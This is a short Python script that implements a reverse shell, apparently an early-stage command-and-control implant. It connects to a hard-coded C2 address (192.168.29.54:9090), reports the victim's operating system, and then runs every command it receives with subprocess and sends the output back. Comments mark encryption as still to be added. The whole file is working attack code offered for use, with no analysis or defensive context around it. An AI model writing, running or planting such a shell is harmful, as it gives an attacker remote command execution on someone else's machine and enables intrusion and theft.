#!/usr/bin/python3

#to implement cryptography

import socket
import subprocess,platform

C2SERVER = '192.168.29.54:9090'.split(':')

class reverseconnection():
    
    def unix_windows_revcon(self):
        revconn = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
        revconn.connect((C2SERVER[0],int(C2SERVER[-1])))

        #sending os
        revconn.sendall((platform.system()).encode('utf-8'))

        try:
            while 1:
                
                command = revconn.recv(4096).decode("utf-8")

                if command.lower() == 'exit':
                    break

                output = subprocess.getoutput(command)

                #to implement cryptography
                revconn.sendall(output.encode('utf-8'))
        
        except Exception as e:
            print(e)
        
        except KeyboardInterrupt:
            pass

        finally:
            revconn.close()
    

if __name__ == '__main__':
    obj = reverseconnection()
    obj.unix_windows_revcon()